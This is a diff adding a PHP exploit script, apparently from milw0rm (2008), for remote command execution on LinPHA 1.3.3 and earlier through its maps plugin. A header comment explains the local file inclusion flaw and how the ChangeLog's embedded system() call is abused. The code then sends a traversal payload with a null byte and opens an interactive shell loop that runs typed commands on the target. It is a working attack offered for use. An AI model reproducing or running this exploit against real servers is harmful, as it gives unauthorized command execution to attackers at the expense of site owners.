@@ -1,0 +1,136 @@
+<?php
+
+/*
+	--------------------------------------------------------------
+	LinPHA <= 1.3.3 (maps plugin) Remote Command Execution Exploit
+	--------------------------------------------------------------
+	
+	author...: EgiX
+	mail.....: n0b0d13s[at]gmail[dot]com
+	
+	link.....: http://linpha.sourceforge.net
+	details..: works with magic_quotes_gpc = off
+
+	[-] LFI found by rgod in /plugins/maps/map.main.class.php
+
+	20.	if(!defined('TOP_DIR')) { define('TOP_DIR','../'); }
+	21.	
+	22.	$type = read_config('maps_type');
+	23.	
+	24.	require_once(TOP_DIR."/plugins/maps/$type/$type.class.php"); <== LFI
+	25.	require_once(TOP_DIR.'/plugins/maps/geocode.class.php');
+	26.	include_once(TOP_DIR.'/plugins/maps/location.class.php');
+
+	an attacker could be include an arbitrary local file through the require_once() at
+	line 24 cause is possible to modify 'maps_type' config value by another script:
+
+	[-] look at /plugins/maps/db_handler.php
+
+	112.	if(@	$_POST['job'] == "settings") 
+	113.	{
+	114.	update_config($_POST['maps_yahoo_id'], 'maps_yahoo_id' );
+	115.	update_config($_POST['maps_google_key'], 'maps_google_key');
+	116.	update_config($_POST['maps_type'], 'maps_type');			<== 'maps_type' value updating
+	117.	update_config($_POST['maps_display_type'], 'maps_display_type');
+	118.	update_config($_POST['maps_google_ctrl_size'], 'maps_google_ctrl_size');
+	119.	update_config($_POST['maps_default_zoom'], 'maps_default_zoom');
+	120.	update_config($_POST['maps_default_zoom_location'], 'maps_default_zoom_location');
+	121.	update_config($_POST['maps_yahoo_type_control'], 'maps_yahoo_type_control');
+	122.	update_config($_POST['maps_yahoo_pan_control'], 'maps_yahoo_pan_control');
+	123.	update_config($_POST['maps_yahoo_slide_control'], 'maps_yahoo_slide_control'); 
+	124.	update_config($_POST['maps_marker_auto_popup'], 'maps_marker_auto_popup'); 
+	125.	
+	126.	header("Location: ".TOP_DIR."/admin.php?page=maps&plugins=1");
+	127.	}
+
+	and now we need a file to include...what do you think about ChangeLog?
+
+	[-] ChangeLog file:
+
+	393.	###############################################
+	394.	###                                         ###
+	395.	###          LinPHA 1.1.0 RELEASE!          ###
+	396.	###                                         ###
+	397.	###############################################
+	398.	
+	399.	2006-02-19  bzrudi71 <linpha_AT_tuxpower_DOT_de>
+	400.	 * tagged LinPHA linpha_1_1_0 :-)
+	401.	
+	402.	2006-02-18  flo
+	403.	 * fixed linpha vulnerability found on secunia.com
+	404.	   + docs/index.php and install/*
+	405.	     include($lang) fixed
+	406.	   + plugins/log/logger.class.php
+	407.	     use htmlspecialchars() before write logger events to database or to text file
+	408.	     for example:
+	409.	     User <?php echo system($_GET['cwd']); ?>: login failed! <== oops! ;)
+	410.	     will be replaced by:
+	411.	     User &lt;?php echo system($_GET[&#039;cwd&#039;]); ?&gt;: login failed!
+
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet)
+{
+	$sock = fsockopen($host, 80);
+	while (!$sock)
+	{
+		print "\n[-] No response from ".$host.":80 Trying again...";
+		$sock = fsockopen($host, 80);
+	}
+	fputs($sock, $packet);
+	while (!feof($sock)) $resp .= fread($sock, 1024);
+	fclose($sock);
+	return $resp;
+}
+
+print "\n+------------------------------------------------------------------------+";
+print "\n| LinPHA <= 1.3.3 (maps plugin) Remote Command Execution Exploit by EgiX |";
+print "\n| - bug (LFI) found by rgod                                              |";
+print "\n+------------------------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+	print "\nUsage...:	php $argv[0] host path\n";
+	print "\nhost....:	target server (ip/hostname)";
+	print "\npath....:	path to Linpha directory\n";
+	die();
+}
+
+$host	= $argv[1];
+$path	= $argv[2];
+	
+$payload = "job=settings&maps_type=%2E%2E/%2E%2E/ChangeLog%00";
+$packet  = "POST {$path}plugins/maps/db_handler.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Connection: close\r\n\r\n";
+$packet .= $payload;
+http_send($host, $packet);
+	
+define(STDIN, fopen("php://stdin", "r"));
+
+while(1)
+{
+	print "\nlinpha-shell# ";
+	$cmd = trim(fgets(STDIN));
+	if ($cmd != "exit")
+	{
+		$packet = "GET {$path}maps_view.php?cwd=".urlencode($cmd)." HTTP/1.0\r\n";
+		$packet.= "Host: {$host}\r\n";
+		$packet.= "Connection: close\r\n\r\n";
+		$resp	= http_send($host, $packet);
+		if (!ereg("ChangeLog", $resp)) die("\n[-] Exploit failed...probably magic_quotes_gpc = on\n");
+		preg_match("/User (.*): login failed!\n /s", $resp, $shell);
+		print "\n{$shell[1]}\n";
+	}
+	else break;
+}
+
+?>
+
+# milw0rm.com [2008-04-07]
